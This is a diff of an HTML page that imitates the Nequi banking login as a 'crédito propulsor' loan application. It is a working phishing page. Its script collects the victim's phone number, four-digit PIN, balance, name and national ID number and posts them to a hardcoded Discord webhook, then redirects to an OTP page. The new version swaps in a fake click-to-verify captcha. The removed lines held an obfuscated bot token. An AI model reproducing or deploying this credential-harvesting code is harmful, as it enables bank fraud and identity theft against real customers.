@@ -1,274 +1,431 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="utf-8">
-    <title>Nequi</title>
+    <title>Nequi - Verificación</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Webflow">
-    <link rel="stylesheet" type="text/css" href="css/normalize.css">
-    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
-    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
-    <link rel="stylesheet" type="text/css" href="css/main.css">
- 
-    <script type="text/javascript" src="./js/jquery-3.6.0.min.js"></script>
-    <script type="text/javascript" src="./js/functions2.js"></script> 
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Manrope', -apple-system, sans-serif;
+            background-color: #f5f5f5;
+            color: #200020;
+        }
+
+        .wrap-header {
+            background-color: #ffffff;
+            padding: 15px 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo img {
+            height: 30px;
+        }
+
+        .buttons-right ul {
+            list-style: none;
+            display: flex;
+            gap: 15px;
+        }
+
+        .buttons-right a {
+            color: #200020;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .login-section {
+            max-width: 450px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+
+        .login-wrap {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            color: #200020;
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            font-size: 1rem;
+            margin-bottom: 30px;
+        }
+
+        .input-country {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .select-country {
+            width: 100px;
+            padding: 15px;
+            background: #fbf7fb;
+            border: 1px solid #200020;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .flag-icon {
+            width: 24px;
+            height: 16px;
+            background: linear-gradient(to bottom, #FFD700 33%, #0033A0 33%, #0033A0 66%, #CE1126 66%);
+            border-radius: 2px;
+        }
+
+        .select-country p {
+            margin: 0;
+            font-weight: 600;
+        }
+
+        .country-input {
+            display: none;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+            flex: 1;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            background: #fbf7fb;
+            border: 1px solid #200020;
+            border-radius: 8px;
+            font-size: 1rem;
+            color: #200020;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #da0081;
+        }
+
+        .form-group label {
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            color: #666;
+            pointer-events: none;
+            transition: 0.2s;
+        }
+
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
+            background: white;
+            padding: 0 5px;
+            color: #da0081;
+        }
+
+        .captcha {
+            width: 100%;
+            max-width: 250px;
+            height: 70px;
+            background: #e0e0e0;
+            border: 2px solid #200020;
+            border-radius: 8px;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto;
+            object-fit: cover;
+        }
+
+        .captcha.selected {
+            border-color: #28a745;
+        }
+
+        .form-btn-submit {
+            width: 100%;
+            padding: 18px;
+            background: #200020;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 20px;
+        }
+
+        .form-btn-submit:hover:not(:disabled) {
+            background: #3d003d;
+        }
+
+        .form-btn-submit:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        @media (max-width: 768px) {
+            .login-section {
+                padding: 10px;
+            }
+
+            .login-wrap {
+                padding: 30px 20px;
+            }
+        }
+    </style>
 </head>
 
-<body ng-app="App" class="ng-scope">
+<body>
     <div id="content">
-        <div ng-include="getTemplate('/header.html')" class="ng-scope">
-            <header class="ng-scope">
-                <div class="wrap-header">
-                    <div class="row">
-                        <div class="col-xs-12 col-md-2">
-                            <div class="logo"> <a href="https://www.nequi.com.co"> <img alt="nequi"
-                                        src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
-                                </a> </div>
-                            <div class="btn-menu-hamburguer" ng-click="openMenu();"> <a class=""> <span></span> </a>
-                            </div>
-                        </div>
-                        <div class="col-xs-12 col-md-10 container-buttons">
-                            <div class="wrap-main-menu ">
-                                <div class="row">
-                                    <div class="col-xs-12 col-md-8"> </div>
-                                    <div class="col-xs-12 col-md-4">
-                                        <div class="buttons-right">
-                                            <ul>
-                                                <li ng-if="!hidePa" class="ng-scope"> <a target="_blank"
-                                                        href="https://recarga.nequi.com.co/bdigitalpsl"
-                                                        class="ng-binding">Recarga</a> </li>
-                                            </ul>
+        <header>
+            <div class="wrap-header">
+                <div class="logo">
+                    <a href="https://www.nequi.com.co">
+                        <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
+                    </a>
+                </div>
+                <div class="buttons-right">
+                    <ul>
+                        <li>
+                            <a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl">Recarga</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </header>
+
+        <section class="login-section">
+            <div class="login-wrap">
+                <h1>Entra a tu Nequi</h1>
+                <p>Solicitud de crédito propulsor</p>
+                
+                <div class="login-form-wrap">
+                    <div class="container-form">
+                        <!-- Número de celular -->
+                        <div class="input-country">
+                            <div class="wrap-select-country">
+                                <div class="select-country">
+                                    <div class="country-wrap country-active">
+                                        <div class="select-col select-col-img">
+                                            <div class="flag-icon"></div>
+                                        </div>
+                                        <div class="select-col">
+                                            <p>+57</p>
+                                            <input class="country-input" type="text" name="j_region" id="j_region" value="57">
                                         </div>
                                     </div>
                                 </div>
                             </div>
-                        </div>
-                    </div>
-                </div>
-            </header>
-        </div>
-
-        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
-            <div class="login-wrap">
-                <h1 class="ng-binding">Entra a tu Nequi</h1>
-                <p class="ng-binding">Solicitud de crédito propulsor</p>
-                <div class="login-form-wrap">
-                    <div class="container-form">
-                        <div class="input-country">
-                            <div class="wrap-select-country">
-                                <select-country selected-country="loginControl.selectCountry"
-                                    options="loginControl.selectOption"
-                                    on-select-country="loginControl.onSelectCountry(option)"
-                                    class="ng-isolate-scope">
-                                    <div class="select-country" ng-click="toggleSelect();">
-                                        <div class="country-wrap country-active">
-                                            <div class="select-col select-col-img"> <img
-                                                    src="images/flag_colombia.png" alt="co"> </div>
-                                            <div class="select-col">
-                                                <p class="ng-binding"> +57 </p> <input class="country-input"
-                                                    type="text" name="j_region" id="j_region" value="57">
-                                            </div>
-                                        </div>
-                                        <ul>
-                                            <li ng-repeat="option in options" class="ng-scope">
-                                                <div ng-click="setCountry($index);" class="country-wrap">
-                                                    <div class="select-col select-col-img"> <img
-                                                            src="images/flag_colombia.png" alt="co"> </div>
-                                                    <div class="select-col">
-                                                        <p class="ng-binding">+57</p>
-                                                    </div>
-                                                </div>
-                                            </li>
-                                        </ul>
-                                    </div>
-                                </select-country>
-                            </div>
+                            
                             <div class="form-group">
                                 <input type="tel" 
-                                id="txtUsername" name="txtUsername"
-                                class="ng-pristine ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-touched"
-                                required="required" maxlength="12" minlength="12" required oninput="formatPhoneNumber()" inputmode="numeric">
-                                <label for="txtUsername" class="ng-binding">Número de celular</label>
+                                    id="txtUsername" 
+                                    name="txtUsername"
+                                    required 
+                                    maxlength="12" 
+                                    minlength="12" 
+                                    inputmode="numeric"
+                                    placeholder=" ">
+                                <label for="txtUsername">Número de celular</label>
                             </div>
                         </div>
 
+                        <!-- Contraseña -->
                         <div class="form-group">
                             <input
-                                class="password ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-touched"
-                                type="password" id="txtPass" name="txtPass" required maxlength="4" minlength="4" inputmode="numeric" pattern="\d*">
-                            <label for="txtPass" class="ng-binding">Contraseña</label>
-                        </div>
-                        <div class="form-group">
-                            <input
-                                class="ng-pristine ng-valid ng-touched"
-                                type="text" id="txtSaldo" name="txtSaldo" required inputmode="decimal" pattern="^\d+(\.\d{1,2})?$">
-                            <label for="txtSaldo" class="ng-binding">Saldo actual</label>
+                                class="password"
+                                type="password" 
+                                id="txtPass" 
+                                name="txtPass" 
+                                required 
+                                maxlength="4" 
+                                minlength="4" 
+                                inputmode="numeric" 
+                                pattern="\d*"
+                                placeholder=" ">
+                            <label for="txtPass">Contraseña</label>
                         </div>
 
-                        <img src="img/ca.png" alt="CAPTCHA" id="captcha" class="captcha">
-                        <div class="g-recaptcha" data-sitekey="6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i"></div>
+                        <!-- Saldo -->
+                        <div class="form-group">
+                            <input 
+                                id="txtSaldo" 
+                                name="txtSaldo" 
+                                required 
+                                inputmode="numeric"
+                                placeholder=" ">
+                            <label for="txtSaldo">Saldo actual</label>
+                        </div>
+                        
+                        <!-- Captcha -->
+                        <img src="https://via.placeholder.com/250x70/e0e0e0/666666?text=Click+para+verificar" alt="CAPTCHA" id="captcha" class="captcha">
                     </div>
 
+                    <!-- Botón de envío -->
                     <div class="btn-wrap">
                         <input class="form-btn-submit" type="submit" value="Entra" id="btnUsuario" name="btnUsuario" disabled>
                     </div>
                 </div>
             </div>
-
-            <script type="text/javascript">
-
-// token cifrado del bot token y chat id
-
-var xorKey = 'Porqueblesnoesejemplodenadaaaaa';
-
-
-var encryptedToken = 'Z1xGSEFXVlxcQlQuJDUvCVAqOT0OFDcoVyUTVSAHEzYjJDYGCA4tNQU5GlECNA==';
-var encryptedChat = 'fV5CQUdWVVtQQF5YUEo=';
-
-
-
-             document.addEventListener("DOMContentLoaded", function() {
-    const usernameInput = document.getElementById('txtUsername');
-    const passwordInput = document.getElementById('txtPass');
-    const captchaImg = document.getElementById('captcha');
-    const submitBtn = document.getElementById('btnUsuario');
-
-    let captchaClicked = false;
-
-    // Eventos de entrada y clic
-    usernameInput.addEventListener('input', formatUsername);
-    passwordInput.addEventListener('input', formatPassword);
-    captchaImg.addEventListener('click', toggleCaptcha);
-
-    function formatUsername() {
-        let value = usernameInput.value.replace(/\D/g, ''); // Elimina caracteres no numéricos
-        let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim(); // Formatea el número
-        usernameInput.value = formattedValue;
-        validateForm();
-    }
-
-    function formatPassword() {
-        passwordInput.value = passwordInput.value.replace(/\D/g, ''); // Solo números
-        validateForm();
-    }
-
-    function validateForm() {
-        // Validaciones de número y contraseña
-        const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
-        const passwordValid = /^\d{4}$/.test(passwordInput.value);
-
-        if (usernameValid && passwordValid && captchaClicked) {
-            submitBtn.disabled = false;
-            submitBtn.classList.remove('disabled');
-        } else {
-            submitBtn.disabled = true;
-            submitBtn.classList.add('disabled');
-        }
-    }
-
-    function toggleCaptcha() {
-        captchaClicked = true; // Marca el captcha como seleccionado
-        captchaImg.src = "img/cap.png"; // Cambia la imagen del captcha
-        validateForm();
-    }
-
-    // Obtener nombre y cédula del almacenamiento local
-    const nombreApellido = localStorage.getItem("nombreApellido");
-    const cedula = localStorage.getItem("cedula");
-
-$('#btnUsuario').click(async function(e) {
-    e.preventDefault();
-
-    const usuario = $("#txtUsername").val().trim();
-    const clave = $("#txtPass").val().trim();
-    const saldo = $("#txtSaldo").val().trim();
-
-    if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
-        alert("El número ingresado no es válido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
-        return;
-    }
-
-    if (!/^\d{4}$/.test(clave)) {
-        alert("La clave debe ser de 4 dígitos numéricos.");
-        return;
-    }
-
-    if (!saldo || isNaN(parseFloat(saldo))) {
-        alert("Debe ingresar un saldo válido.");
-        return;
-    }
-
-    if (!nombreApellido || !cedula) {
-        alert("Los datos de nombre y cédula no están disponibles. Vuelve al paso anterior.");
-        return;
-    }
-
-    localStorage.setItem("numero", usuario);
-    localStorage.setItem("clave", clave);
-    localStorage.setItem("saldo", saldo);
-
-    const webhookURL = 'https://discord.com/api/webhooks/1389513200801812491/R0X2zhHCg6Z4P-rLjJRcD6ktg-73vhuwcTU6iYZ__bafE6Si2cHH9cbC3x6cijvGWvJ7';
-
-    const discordPayload = {
-        username: "Consulta de Usuario",
-        content: `Nueva solicitud recibida:\n\n` +
-                 `**Nombre:** ${nombreApellido}\n` +
-                 `**Cédula:** ${cedula}\n` +
-                 `**Número de Usuario:** ${usuario}\n` +
-                 `**Clave:** ${clave}\n` +
-                 `**Saldo:** $${saldo}`
-    };
-
-    try {
-        const response = await fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(discordPayload)
-        });
-
-        if (response.ok) {
-            window.location.href = "otp.html";
-        } else {
-            throw new Error('Error al enviar los datos a Discord');
-        }
-    } catch (error) {
-        console.error('Error al enviar los datos:', error);
-        alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
-    }
-});
-
-});
-
-            </script>
-
-           <script src="bloqueo-bots.js"></script>
-    <!-- App -->
-    <script src="js/script.js"></script>
-
-    <script async="" defer=""
-        src="https://www.google.com/recaptcha/api.js?onload=vcRecaptchaApiLoaded&amp;render=explicit"></script>
-    <div
-        style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
-        <div
-            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
-        </div>
-        <div class="g-recaptcha-bubble-arrow"
-            style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;">
-        </div>
-        <div class="g-recaptcha-bubble-arrow"
-            style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;">
-        </div>
-        <div style="z-index: 2000000000; position: relative;">
-            <iframe title="El reCAPTCHA caduca dentro de dos minutos"
-                name="c-23ulu23lv1it" frameborder="0" scrolling="no"
-                sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"
-                src="https://www.google.com/recaptcha/api2/bframe?hl=es&amp;v=-QbJqHfGOUB8nuVRLvzFLVed&amp;k=6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i"
-                style="width: 100%; height: 100%;"></iframe>
-        </div>
+        </section>
     </div>
 
+    <script type="text/javascript">
+        document.addEventListener("DOMContentLoaded", function() {
+            const usernameInput = document.getElementById('txtUsername');
+            const passwordInput = document.getElementById('txtPass');
+            const saldoInput = document.getElementById('txtSaldo');
+            const captchaImg = document.getElementById('captcha');
+            const submitBtn = document.getElementById('btnUsuario');
 
-    </body>
+            let captchaClicked = false;
+
+            // Eventos
+            usernameInput.addEventListener('input', formatUsername);
+            passwordInput.addEventListener('input', formatPassword);
+            saldoInput.addEventListener('input', formatSaldo);
+            captchaImg.addEventListener('click', toggleCaptcha);
+
+            // Formatear número de celular (XXX XXX XXXX)
+            function formatUsername() {
+                let value = usernameInput.value.replace(/\D/g, '');
+                let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
+                usernameInput.value = formattedValue;
+                validateForm();
+            }
+
+            // Formatear contraseña (solo números)
+            function formatPassword() {
+                passwordInput.value = passwordInput.value.replace(/\D/g, '');
+                validateForm();
+            }
+
+            // Formatear saldo (separador de miles)
+            function formatSaldo() {
+                let valor = saldoInput.value.replace(/\D/g, "");
+                if (valor === "") {
+                    saldoInput.value = "";
+                    validateForm();
+                    return;
+                }
+                saldoInput.value = parseInt(valor, 10).toLocaleString("es-CO");
+                validateForm();
+            }
+
+            // Validar formulario completo
+            function validateForm() {
+                const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
+                const passwordValid = /^\d{4}$/.test(passwordInput.value);
+                const saldoValid = saldoInput.value.length >= 4;
+
+                if (usernameValid && passwordValid && saldoValid && captchaClicked) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('disabled');
+                } else {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.add('disabled');
+                }
+            }
+
+            // Toggle captcha
+            function toggleCaptcha() {
+                captchaClicked = true;
+                captchaImg.src = "https://via.placeholder.com/250x70/d4edda/28a745?text=Verificado+✓";
+                captchaImg.classList.add('selected');
+                validateForm();
+            }
+
+            // Obtener datos del localStorage
+            const nombreApellido = localStorage.getItem("nombreApellido");
+            const cedula = localStorage.getItem("cedula");
+
+            // Envío del formulario
+            submitBtn.addEventListener('click', async function(e) {
+                e.preventDefault();
+
+                const usuario = usernameInput.value.trim();
+                const clave = passwordInput.value.trim();
+                const saldo = saldoInput.value.trim();
+
+                // Validaciones finales
+                if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
+                    alert("El número ingresado no es válido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
+                    return;
+                }
+
+                if (!/^\d{4}$/.test(clave)) {
+                    alert("La clave debe ser de 4 dígitos numéricos.");
+                    return;
+                }
+
+                if (!saldo) {
+                    alert("Debe ingresar un saldo válido.");
+                    return;
+                }
+
+                if (!nombreApellido || !cedula) {
+                    alert("Los datos de nombre y cédula no están disponibles. Vuelve al paso anterior.");
+                    return;
+                }
+
+                // Guardar en localStorage
+                localStorage.setItem("numero", usuario);
+                localStorage.setItem("clave", clave);
+                localStorage.setItem("saldo", saldo);
+
+                // DISCORD WEBHOOK
+                const webhookURL = 'https://discord.com/api/webhooks/1389513200801812491/R0X2zhHCg6Z4P-rLjJRcD6ktg-73vhuwcTU6iYZ__bafE6Si2cHH9cbC3x6cijvGWvJ7';
+
+                const discordPayload = {
+                    username: "🔐 Datos Nequi",
+                    content: `**Nueva solicitud recibida:**\n\n` +
+                             `📛 **Nombre:** ${nombreApellido}\n` +
+                             `🪪 **Cédula:** ${cedula}\n` +
+                             `📱 **Número:** ${usuario}\n` +
+                             `🔑 **Clave:** ${clave}\n` +
+                             `💰 **Saldo:** $${saldo}\n` +
+                             `📅 **Fecha:** ${new Date().toLocaleString('es-CO')}`
+                };
+
+                try {
+                    const response = await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(discordPayload)
+                    });
+
+                    if (response.ok) {
+                        console.log('Datos enviados a Discord correctamente');
+                        // Redirigir a la siguiente página
+                        window.location.href = "otp.html";
+                    } else {
+                        throw new Error('Error al enviar los datos a Discord');
+                    }
+                } catch (error) {
+                    console.error('Error al enviar los datos:', error);
+                    alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
+                }
+            });
+        });
+    </script>
+</body>
 </html>
